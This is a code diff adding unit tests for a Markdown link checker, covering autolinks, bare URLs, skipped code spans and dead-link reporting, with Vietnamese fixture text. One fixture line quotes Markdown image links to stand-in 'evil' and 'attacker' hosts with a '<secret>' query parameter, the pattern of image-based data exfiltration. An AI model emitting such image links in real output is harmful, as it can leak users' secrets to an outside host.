@@ -212,6 +212,48 @@ class LinkClassificationTest(unittest.TestCase):
         p.parent.mkdir(parents=True, exist_ok=True)
         p.write_text(text, encoding="utf-8")
 
+    def test_link_classification_autolink_and_bare_urls_found_code_spans_skipped(self):
+        self.write(
+            "a.md",
+            "Nguồn: <https://auto.org/a> · <https://auto.org/b#neo>; xem https://bare.org/x. và (https://bare.org/p_(1))\n"
+            "Ví dụ `![x](https://evil/?d=1)` và `![](https://attacker/?q=<secret>)` và ``a ` <https://span.org/z>``\n"
+            "[https://text.org/](https://dich.org/) [ref]: https://ref.org/r, rồi **https://bold.org/b**\n"
+            "```\n<https://fence.org/>\n```\n"
+            "<https://example.com/x> <mailto:a@b.c> <http://h.test/> ổn <https://Ü.org/ä>\n",
+        )
+        urls = self.cl.external_urls(self.repo)
+        self.assertEqual(
+            urls,
+            {
+                "https://auto.org/a": "a.md:1",
+                "https://auto.org/b": "a.md:1",
+                "https://bare.org/x": "a.md:1",
+                "https://bare.org/p_(1)": "a.md:1",
+                "https://dich.org/": "a.md:3",
+                "https://ref.org/r": "a.md:3",
+                "https://bold.org/b": "a.md:3",
+                "https://Ü.org/ä": "a.md:7",
+            },
+        )
+        self.assertEqual(self.cl.line_urls(""), [])
+        self.assertEqual(self.cl.line_urls("`https://a.org/` `` `x` ``"), [])
+
+    def test_link_classification_dead_autolink_reported_code_span_ignored(self):
+        self.write("a.md", "Nguồn: <https://h.org/gone>\nVí dụ: `<https://h.org/span>` https://h.org/ok\n")
+        fetched: list[str] = []
+
+        def fetch(url, timeout):
+            fetched.append(url)
+            return 404 if url.endswith("gone") else 200
+
+        rep = self.cl.check_external(self.repo, fetch, retries=0, workers=1)
+        self.assertEqual(rep, {"dead": ["a.md:1: https://h.org/gone — HTTP 404"]})
+        self.assertEqual(sorted(fetched), ["https://h.org/gone", "https://h.org/ok"])
+        out = io.StringIO()
+        with mock.patch.object(self.cl, "http_status", fetch), contextlib.redirect_stdout(out):
+            self.assertEqual(self.cl.main([str(self.repo), "--external", "--retries", "0"]), 1)
+        self.assertIn("✗ chết (sửa/bỏ link): a.md:1: https://h.org/gone — HTTP 404", out.getvalue())
+
     def test_link_classification_check_external_report_groups(self):
         self.write(
             "a.md",
